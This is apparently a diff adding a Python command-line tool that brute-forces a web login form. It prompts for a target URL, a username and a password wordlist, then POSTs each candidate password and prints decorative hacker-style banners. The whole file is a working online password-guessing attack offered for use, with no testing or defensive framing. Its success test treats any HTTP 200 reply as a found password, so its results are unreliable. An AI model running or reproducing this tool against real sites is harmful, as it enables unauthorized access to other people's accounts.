@@ -1,0 +1,121 @@
+#kasau
+#python3
+import random
+import requests
+from termcolor import colored
+import os
+import time
+
+# === Random ASCII Headers ===
+ascii_headers = [
+    """\
+ __            __         _                                      
+ \ \   ___ ___/ /__  ____(_)____ _   _____  _________  ________ _
+  \ \ / _ `/ _  / _ \/ __/ / __ `/  / ___/ / ___/ __ \/ ___/ _ `/
+ /_/ \_,_/\_,_/\___/_/ /_/\_,_/(_) /_/    /_/   \___/_/   \_,_/  
+""",
+    """\
+ ____        _     _            _      _             
+| __ )  __ _| |__ | | ___   ___| | __ (_) __ _ _ __  
+|  _ \ / _` | '_ \| |/ _ \ / __| |/ / | |/ _` | '_ \ 
+| |_) | (_| | |_) | | (_) | (__|   < _| | (_| | | | |
+|____/ \__,_|_.__/|_|\___/ \___|_|\_(_)_|\__,_|_| |_|
+""",
+    """\
+ _      ____   _____ ______   _______ ____  _____  
+| |    / __ \ / ____|  ____| |__   __/ __ \|  __ \ 
+| |   | |  | | (___ | |__       | | | |  | | |__) |
+| |   | |  | |\___ \|  __|      | | | |  | |  _  / 
+| |___| |__| |____) | |____     | | | |__| | | \ \ 
+|______\____/|_____/|______|    |_|  \____/|_|  \_\
+"""
+]
+
+# === Color Themes ===
+themes = [
+    ("green", "on_black"),
+    ("yellow", "on_blue"),
+    ("cyan", "on_red"),
+    ("magenta", "on_white"),
+    ("white", "on_grey")
+]
+
+# === Utility Functions ===
+def clear():
+    """Clear the terminal screen."""
+    os.system("cls" if os.name == "nt" else "clear")
+
+def display_banner():
+    """Display a randomly-selected ASCII banner with random colors."""
+    clear()
+    ascii_art = random.choice(ascii_headers)
+    fg, bg = random.choice(themes)
+    print(colored(ascii_art, fg, bg))
+
+# === Bruteforce Login Function ===
+def bruteforce_login(url, username, wordlist_path, username_field='username', password_field='password'):
+    """
+    Perform a bruteforce login attempt using a wordlist.
+
+    Args:
+        url (str): Target login URL.
+        username (str): Username to attempt login with.
+        wordlist_path (str): Path to the password wordlist file.
+        username_field (str): Name of the username field in the login form.
+        password_field (str): Name of the password field in the login form.
+
+    Returns:
+        str: The correct password if found, or None if not found.
+    """
+    try:
+        # Check if the wordlist file exists
+        if not os.path.exists(wordlist_path):
+            print(colored(f"[!] Wordlist file not found: {wordlist_path}", "red"))
+            return None
+
+        # Read passwords from wordlist
+        with open(wordlist_path, 'r') as file:
+            passwords = file.read().splitlines()
+
+        # Iterate through passwords and attempt login
+        for password in passwords:
+            data = {username_field: username, password_field: password}
+            try:
+                response = requests.post(url, data=data, timeout=10)
+                print(f"Trying: {username}:{password}")
+
+                # Check for success conditions
+                if "Welcome" in response.text or response.status_code == 200:
+                    print(colored(f"[+] Password Found: {password}", "green"))
+                    return password
+            except requests.exceptions.RequestException as e:
+                print(colored(f"[!] Request error: {e}", "red"))
+                continue
+
+        print(colored("[-] Password not found in wordlist.", "red"))
+        return None
+    except Exception as e:
+        print(colored(f"[!] Error: {e}", "red"))
+        return None
+
+# === Main Execution ===
+if __name__ == "__main__":
+    # Display a random banner
+    display_banner()
+
+    # Input collection
+    target_url = input(colored("Target URL: ", "cyan"))
+    user = input(colored("Username: ", "cyan"))
+    wordlist = input(colored("Path to wordlist: ", "cyan"))
+    field_user = input(colored("Username field name (default: username): ", "cyan")) or "username"
+    field_pass = input(colored("Password field name (default: password): ", "cyan")) or "password"
+
+    # Start bruteforce process
+    print(colored("\n[+] Starting Bruteforce...\n", "yellow"))
+    result = bruteforce_login(target_url, user, wordlist, field_user, field_pass)
+    
+    # Display result
+    if result:
+        print(colored(f"[✓] Login successful! Password: {result}", "green"))
+    else:
+        print(colored("[✗] Login failed. No valid password found.", "red"))
